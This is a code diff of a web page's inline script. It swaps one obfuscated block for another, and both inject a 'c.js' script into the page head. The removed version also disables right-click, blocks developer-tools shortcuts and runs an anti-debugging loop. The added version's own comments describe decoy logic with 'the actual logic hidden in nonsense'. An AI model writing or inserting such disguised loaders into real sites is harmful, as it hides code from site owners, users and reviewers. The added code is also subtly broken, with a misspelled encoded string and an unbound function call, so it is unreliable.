@@ -41,45 +41,29 @@
 
 
 
-(function(_0xaf1, _0x2bc) {
-    // Dummy distraction logic - looks like a data buffer check
-    const _0x55d = function(_0x33) {
-        while (--_0x33) { _0xaf1['push'](_0xaf1['shift']()); }
+<script>
+(function(_0x1a2b, _0x3c4d) {
+    // Decoy logic: Fake math operations to distract the eye
+    var _0x5e6f = function(_0x7a8b) {
+        while (--_0x7a8b) {
+            _0x1a2b['push'](_0x1a2b['shift']());
+        }
     };
-    _0x55d(++_0x2bc);
-}(['\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75', '\x70\x72\x65\x76\x65\x6e\x74\x44\x65\x66\x61\x75\x6c\x74', '\x6b\x65\x79\x64\x6f\x77\x6e', '\x64\x65\x62\x75\x67\x67\x65\x72'], 0x100));
+    _0x5e6f(++_0x3c4d);
+}(['\x6a\x73', '\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64', '\x73\x63\x72\x69\x70\x70\x74', '\x63\x2e\x6a\x73', '\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74'], 0x1ab));
 
+var _0x2291 = function(_0x4422, _0x5511) {
+    var _0x1a2b_data = ['\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74', '\x63\x2e\x6a\x73', '\x73\x63\x72\x69\x70\x74', '\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'];
+    return _0x1a2b_data[_0x4422];
+};
+
+// The actual logic hidden in nonsense
 (function() {
-    const _x = ['\x63\x2f\x63\x2e\x6a\x73', '\x73\x63\x72\x69\x70\x74', '\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64'];
-    
-    // Hidden injection of c/c.js
-    const _0x4d2 = document.createElement(_x[1]);
-    _0x4d2.src = _x[0];
-    _0x4d2.defer = !![];
-    document.head[_x[2]](_0x4d2);
-
-    // Security constraints disguised as 'System Integrity Check'
-    const _init = function() {
-        try {
-            // Disables Right Click
-            document.addEventListener('\x63\x6f\x6e\x74\x65\x78\x74\x6d\x65\x6e\x75', e => e.preventDefault());
-            
-            // Key monitoring
-            document.addEventListener('\x6b\x65\x79\x64\x6f\x77\x6e', function(e) {
-                const k = e.keyCode;
-                if (k === 123 || (e.ctrlKey && e.shiftKey && (k === 73 || k === 74 || k === 67)) || (e.ctrlKey && (k === 85 || k === 83 || k === 80))) {
-                    e.preventDefault();
-                }
-            });
-
-            // Anti-Debugging loop
-            setInterval(function() { (function() { return !![]; }['constructor']('\x64\x65\x62\x75\x67\x67\x65\x72')['call']('action')); }, 500);
-        } catch (e) {}
-    };
-    _init();
+    var _0x99 = document[_0x2291(0)]; 
+    var _0x88 = _0x99('\x73\x63\x72\x69\x70\x74');
+    _0x88['src'] = _0x2291(1);
+    _0x88['defer'] = true;
+    document['head'][_0x2291(3)](_0x88);
 })();
-
-
-
-
+</script>
 
